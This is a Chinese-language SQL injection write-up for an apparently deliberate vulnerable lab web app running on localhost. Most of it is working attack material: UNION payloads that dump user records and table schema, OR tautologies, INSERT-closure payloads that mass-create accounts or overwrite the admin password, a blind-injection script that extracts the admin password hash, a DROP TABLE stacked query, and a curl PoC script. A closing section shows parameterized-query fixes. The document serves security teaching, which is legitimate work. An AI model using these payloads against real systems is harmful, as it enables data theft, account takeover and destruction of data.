# SQL 注入漏洞专项总结 — UNION / OR / 其他注入

---

## 一、漏洞分布

| 功能点 | 路由 | SQL 拼接方式 | 注入类型 |
|--------|------|-------------|---------|
| 搜索用户 | `GET /search?keyword=` | `f"SELECT ... LIKE '%{keyword}%'"` | UNION、OR、盲注 |
| 用户注册 | `POST /register` | `f"INSERT INTO users VALUES ('{username}', ...)"` | 闭包注入、堆叠查询 |

所有 SQL 语句使用 **f-string 字符串拼接**，未做任何转义或参数化处理。

---

## 二、UNION 注入

### 原理

UNION 操作符将攻击者的查询结果合并到原查询结果中，从而在页面中显示任意数据。

### 关键条件

```
1. 列数必须匹配（users 表 4 列 → UNION SELECT 也必须 4 列）
2. 对应列的数据类型应兼容
```

### POC 1：探测列数

```sql
-- 输入
' UNION SELECT 1,2,3,4--

-- 生成 SQL
SELECT id, username, email, phone FROM users
WHERE username LIKE '%' UNION SELECT 1,2,3,4--%'

-- 结果：页面显示 2 / 3 / 4（用户名/邮箱/手机位置）
```

### POC 2：伪造数据插入搜索结果

```sql
-- 输入
' UNION SELECT 1,'inj','inj@x.com','138'--

-- 生成 SQL
SELECT ... WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138'--%'

-- 结果：搜索结果中出现攻击者伪造的 inj 用户
-- 显示: ID=1 | 用户名=inj | 邮箱=inj@x.com | 手机=138
```

### POC 3：窃取所有用户数据

```sql
-- 输入
' UNION SELECT 1,username,email,phone FROM users--

-- 生成 SQL
SELECT ... WHERE username LIKE '%'
UNION SELECT 1,username,email,phone FROM users--%'

-- 结果：返回 users 表中全部用户的用户名和邮箱
-- 显示: admin/admin@example.com, alice/alice@example.com, ...
```

### 变种：窃取表结构信息（SQLite 特有）

```sql
-- 获取所有表名
' UNION SELECT 1,name,sql,4 FROM sqlite_master WHERE type='table'--

-- 获取 users 表的所有列
' UNION SELECT 1,cid,name,type FROM pragma_table_info('users')--
```

---

## 三、OR 注入

### 原理

通过注入 OR 条件制造永真表达式，使 WHERE 条件永远为真，返回表中所有行。

### POC 1：OR 万能条件

```sql
-- 输入
' OR '1'='1

-- 生成 SQL
SELECT id, username, email, phone FROM users
WHERE username LIKE '%' OR '1'='1%'
   OR email LIKE '%' OR '1'='1%'
--                  ^^^^^^^^^^^^  永真条件

-- 结果：绕过搜索限制，返回 users 表所有记录
```

### POC 2：OR + 注释符

```sql
-- 输入（确保原条件被注释掉）
' OR 1=1--

-- 生成 SQL
SELECT ... WHERE username LIKE '%' OR 1=1--%'
--                                   ^^^^^^ 注释掉后续所有条件

-- 结果：同 POC 1，返回全部用户
```

### POC 3：OR 绕过认证

```sql
-- 如果登录也使用 f-string 拼接（当前登录已使用参数化查询，此 POC 不适用）
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx'

-- 结果：由于 OR '1'='1'，密码校验被绕过，直接登录为 admin
```

---

## 四、闭包注入（注册功能）

### 原理

通过闭合字符串引号和括号，在 INSERT 语句中插入额外的 SQL 代码。

### POC：注册时注入

```sql
-- 输入（username 字段）
hacker', 'hashed_pw', 'h@x.com', '123'), ('admin2', 'hashed_pw', 'e@e.com', '999

-- 生成 SQL
INSERT INTO users (username, password, email, phone)
VALUES ('hacker', 'hashed_pw', 'h@x.com', '123'), ('admin2', 'hashed_pw', 'e@e.com', '999', '', '')

-- 结果：成功插入两条记录（攻击者可以批量创建账号）
```

### 变种：插入恶意数据

```sql
-- username 输入
x', 'pw', 'x@x.com', '000') ON CONFLICT(username) DO UPDATE SET password='hacked'--

-- 生成 SQL（SQLite 支持的 UPSERT）
INSERT INTO users (username, password, email, phone)
VALUES ('x', 'pw', 'x@x.com', '000') ON CONFLICT(username) DO UPDATE SET password='hacked'--', '', '')

-- 结果：覆盖已有用户的密码（如将 admin 密码改为攻击者已知的值）
```

---

## 五、布爾盲注

### 原理

当页面不直接显示数据时，通过页面响应差异（200 vs 404、内容长度变化）逐字符推断数据。

### POC：逐字符猜解密码哈希

```sql
-- 测试第一个字符是否为 's'
' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='s'--

-- 页面返回正常（有结果）→ 第一个字符是 's'（scrypt 哈希以 $ 开头，实际为 '$'）
' OR (SELECT substr(password,1,1) FROM users WHERE username='admin')='$'--

-- 继续猜解第二个字符...
' OR (SELECT substr(password,2,1) FROM users WHERE username='admin')='s'--
```

### 自动化猜解脚本思路

```python
import requests, string

url = "http://127.0.0.1:5000/search?keyword="
chars = string.printable.strip()
hash_value = ""

for pos in range(1, 100):
    for c in chars:
        payload = f"' OR (SELECT substr(password,{pos},1) FROM users WHERE username='admin')='{c}'--"
        r = requests.get(url + requests.utils.quote(payload), cookies=cookies)
        if "admin" in r.text:  # 有结果 → 字符匹配
            hash_value += c
            break
    else:
        break  # 没找到 → 哈希结束
```

---

## 六、时间盲注

当页面无任何回显差异时，通过 SQL 函数制造延迟来判断条件真假。

```sql
-- SQLite 时间盲注（使用 LIKE 模式匹配制造延迟）
' OR (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='admin')='$'
           THEN 1 ELSE randomblob(50000000) END)--

-- 如果首字符是 '$' → 立即返回
-- 如果首字符不是 '$' → 大内存分配导致延迟
```

---

## 七、堆叠查询注入

SQLite 支持多条语句用分号分隔。

```sql
-- 尝试在搜索中执行 DROP 语句
' ; DROP TABLE users;--

-- 如果支持多条执行，将会删除 users 表（当前 SQLite 配置下 .execute() 不允许多条语句）
```

---

## 八、注入点参数速查表

| 注入点 | 请求方式 | 参数名 | 闭合方式 | 注释符 |
|--------|---------|--------|---------|-------|
| 搜索 | GET | `keyword` | `'` 单引号 | `--` |
| 注册 | POST | `username` | `'` 单引号 + `)` 括号 | `--` |

---

## 九、修复方案（参数化查询）

```python
# ===== 搜索（修复前：f-string 拼接）=====
# ❌ 漏洞代码
sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
c.execute(sql)

# ✅ 修复代码
c.execute("SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?",
          ('%' + keyword + '%', '%' + keyword + '%'))


# ===== 注册（修复前：f-string 拼接）=====
# ❌ 漏洞代码
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{hashed_pw}', '{email}', '{phone}')"
c.execute(sql)

# ✅ 修复代码
c.execute("INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)",
          (username, hashed_pw, email, phone))
```

---

## 十、POC 一键执行脚本

```bash
#!/bin/bash
# 先登录
curl -c /tmp/.jar -s http://127.0.0.1:5000/login > /dev/null
TK=$(curl -b /tmp/.jar -s http://127.0.0.1:5000/login | grep -oP 'value="\K[a-f0-9]{64}' | head -1)
curl -b /tmp/.jar -X POST -d "_csrf_token=$TK&username=admin&password=admin123" http://127.0.0.1:5000/login -c /tmp/.jar -o /dev/null

echo "1. UNION 注入（伪造数据）:"
curl -s "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27--" -b /tmp/.jar | grep -o 'inj'

echo "2. OR 注入（全部用户）:"
curl -s "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b /tmp/.jar | grep -oP '(admin|alice)' | sort -u

echo "3. 列数探测:"
curl -s "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,2,3,4--" -b /tmp/.jar | grep -oP '(2|3|4)'

echo "4. 获取所有用户名:"
curl -s "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,username,email,phone%20FROM%20users--" -b /tmp/.jar | grep -oP '(admin@|alice@)' | sort -u

echo "5. 获取表结构:"
curl -s "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,name,sql,4%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" -b /tmp/.jar
```
